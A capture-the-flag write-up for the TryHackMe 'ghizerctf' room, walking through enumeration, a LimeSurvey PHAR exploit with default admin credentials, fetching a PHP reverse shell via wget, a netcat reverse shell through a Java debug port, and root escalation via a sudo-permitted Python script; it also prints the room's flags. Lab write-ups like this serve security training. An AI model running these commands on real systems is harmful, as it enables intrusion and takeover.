# ghizerctf

Tryhackme ghizerctf - Linux - Medium

https://tryhackme.com/room/ghizerctf

## Nmap
```shell
Nmap scan report for 10.10.11.6
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe: 
|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
|     Please login with USER and PASS.
|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: LimeSurvey http://www.limesurvey.org
|_http-title:         LimeSurvey    
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Ghizer &#8211; Just another WordPress site
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-23T17:27:31
|_Not valid after:  2030-07-21T17:27:31
|_http-generator: WordPress 5.4.2
```

Here we cannot login in FTP with anonymous creds. I also tried to find subdomain using `ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.ghizer.thm" -u http://ghizer.thm -fs 40931` but didnot find anything.

Now, I tried `gobuster`.

```shell
└──╼ $gobuster dir -u ghizer.thm -w /usr/share/wordlists/dirb/small.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ghizer.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/06/14 19:04:44 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 308] [--> http://ghizer.thm/admin/]
/application          (Status: 301) [Size: 314] [--> http://ghizer.thm/application/]
/assets               (Status: 301) [Size: 309] [--> http://ghizer.thm/assets/]     
/docs                 (Status: 301) [Size: 307] [--> http://ghizer.thm/docs/]       
/framework            (Status: 301) [Size: 312] [--> http://ghizer.thm/framework/]  
/tests                (Status: 301) [Size: 308] [--> http://ghizer.thm/tests/]      
/tmp                  (Status: 301) [Size: 306] [--> http://ghizer.thm/tmp/]        
/upload               (Status: 301) [Size: 309] [--> http://ghizer.thm/upload/]
```

Now, from `/docs/release_notes.txt` we can check limesurvey version from change logs. Here in this line `Changes from 3.15.8 (build 190130) to 3.15.9 (build 190214) January 14, 2019` we can say it is < 3.16.

After searching that on google, we got exploit.
https://www.exploit-db.com/exploits/46634

But the problem is where do we find username and password...

.

From nmap scan we can see that at port `443` wordpress service is running, therefore, I used `wpscan` in order to ger username and password.

```shell
└──╼ $wpscan --url https://10.10.11.6/  --disable-tls-checks --passwords /usr/share/wordlists/rockyou.txt  --max-threads 100
```

Huh, weird, still found nothing...

After that, I thought of checking default credentials of `LimeSurvey` on `/admin` and guess what it worked.

Username: `admin`
Password: `password`

Now, getting user from this point is a piece of cake as we already have exploit.

Download exploit and run it using `python2`.

```shell
└──╼ $python2 exploit.py http://ghizer.thm admin password
[*] Logging in to LimeSurvey...
[*] Creating a new Survey...
[+] SurveyID: 437327
[*] Uploading a malicious PHAR...
[*] Sending the Payload...
[*] TCPDF Response: <strong>TCPDF ERROR: </strong>[Image] Unable to get the size of the image: phar://./upload/surveys/437327/files/malicious.jpg
[+] Pwned! :)
[+] Getting the shell...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


... as we cant navigate between files, we have to upload php reverse shell on server ...
$ wget http://10.8.95.227:8000/php_shell.php -O /var/www/html/limesurvey
$ ls
...
php_shell.php
```

send get request to `http://10.10.11.6/php_shell.php` in order to execute shell.

From `/var/www/html/limesurvey/application/config` we got the config.php file, and from that we got username and password for first task.
```shell
		'db' => array(
			'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
			'emulatePrepare' => true,
			'username' => 'Anny',
			'password' => 'P4$W0RD!!#S3CUr3!',
			'charset' => 'utf8mb4',
			'tablePrefix' => 'lime_',
		),
```

`Anny:P4$W0RD!!#S3CUr3!`

Haha, there is no way we can bruteforce this password using `wpscan` earlier.

I have tried some ways but can't succeed. But atlast here's how I manage to get user shell.


Step 1: as there is a ghidra service running on port `18001` we will use `chisel` in order to get data from server to out local. How to do that? Here's how.
- On server
    `$ ./chisel client <local_machine_ip>:10000 R:18001:127.0.0.1:18001`
    
- On local
    `$./chisel server -p 10000 --reverse`

- On local
```
> classes
... you will get list of classes
> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
... after some seconds, we will get shell and then start netcat on port 9999
> print new java.lang.Runtime().exec("nc <local_machine_ip> 9999 -e /bin/sh")
```

Our netcat will listen to request and will give the user shell.

```
└──╼ $nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.8.95.227] from (UNKNOWN) [10.10.11.6] 41024
id
uid=1000(veronica) gid=1000(veronica) groups=1000(veronica),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
cd /home
ls
veronica
cd veronica
cat user.txt
THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}
```

# root flag

```shell
veronica@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for veronica on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User veronica may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
```

```
veronica@ubuntu:~$ cat base.py
cat base.py
import base64

hijackme = base64.b64encode(b'tryhackme is the best')
print(hijackme)

veronica@ubuntu:~$ echo "hello" > base.py
echo "hello" > base.py
bash: base.py: Permission denied
```

We can't edit `base.py` but we can delete it.

```shell
veronica@ubuntu:~$ ls -al | grep base
ls -al | grep base
-rw-r--r--  1 root     root       86 Jul 23  2020 base.py
veronica@ubuntu:~$ rm base.py
rm base.py
rm: remove write-protected regular file 'base.py'? y
y
```

Now make a new file with shell as it is going to execute with root.

`echo 'import pty; pty.spawn("/bin/sh")' > /home/veronica/base.py `

```shell
veronica@ubuntu:~$ sudo -l
sudo -l
Matching Defaults entries for veronica on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User veronica may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
veronica@ubuntu:~$ sudo /usr/bin/python3.5 /home/veronica/base.py
sudo /usr/bin/python3.5 /home/veronica/base.py
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}
```
